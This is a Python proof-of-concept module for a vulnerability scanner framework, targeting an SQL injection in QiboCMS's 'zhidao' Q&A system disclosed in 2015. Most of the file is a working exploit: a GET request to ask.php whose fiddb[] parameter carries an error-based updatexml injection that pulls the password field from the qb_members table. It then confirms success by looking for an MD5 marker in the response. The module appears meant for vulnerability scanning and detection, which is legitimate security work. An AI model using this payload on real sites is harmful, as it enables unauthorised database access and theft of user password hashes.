# coding: utf-8

from CScanPoc.thirdparty import requests
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType


class Vuln(ABVuln):
    vuln_id = 'QiboCMS_0013'  # 平台漏洞编号，留空
    name = 'QiboCMS知道系统 SQL注入'  # 漏洞名称
    level = VulnLevel.HIGH  # 漏洞危害级别
    type = VulnType.INJECTION  # 漏洞类型
    disclosure_date = '2015-06-26'  # 漏洞公布时间
    desc = '''
        齐博CMS前身是龙城于大学期间也即2003年所创建的PHP168网站管理系统，它是国内主流CMS系统之一，曾多次被新浪网、腾讯网、凤凰网等多家大型IT媒体报道。齐博CMS目前已有数以万计的用户在使用，覆盖政府、 企业、科研教育和媒体等各个领域。
        齐博CMS 知道系统，页面参数过滤不严，导致SQL注入。
    '''  # 漏洞描述
    ref = 'https://bugs.shuimugan.com/bug/view?bug_no=0122606'  # 漏洞来源
    cnvd_id = 'Unknown'  # cnvd漏洞编号
    cve_id = 'Unknown'  # cve编号
    product = 'QiboCMS(齐博CMS)'  # 漏洞应用名称
    product_version = 'Unknown'  # 漏洞应用版本


class Poc(ABPoc):
    poc_id = 'c81399bb-9564-4278-9d73-a8a8bc17bd2f'
    author = '47bwy'  # POC编写者
    create_date = '2018-05-17'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())
        self.option_schema = {
            'properties': {
                'base_path': {
                    'type': 'string',
                    'description': '部署路径',
                    'default': '',
                    '$default_ref': {
                        'property': 'deploy_path'
                    }
                }
            }
        }

    def verify(self):
        self.target = self.target.rstrip(
            '/') + '/' + (self.get_option('base_path').lstrip('/'))
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))

            # refer:http://www.wooyun.org/bugs/wooyun-2015-0122606
            payload = "/zhidao/ask.php?step=4&fiddb[]=1)%20and%20updatexml(1,concat(0x5e24,(select%20concat(md5(1234),password)%20from%20qb_members%20limit%201),0x5e24),1)%23&title=wwwwwwww"
            verify_url = self.target + payload
            r = requests.get(verify_url)

            if r.status_code == 200 and "81dc9bdb52d04dc20036dbd8313ed0" in r.text:
                # security_hole(url2)
                self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                    target=self.target, name=self.vuln.name))

        except Exception as e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        self.verify()


if __name__ == '__main__':
    Poc().run()
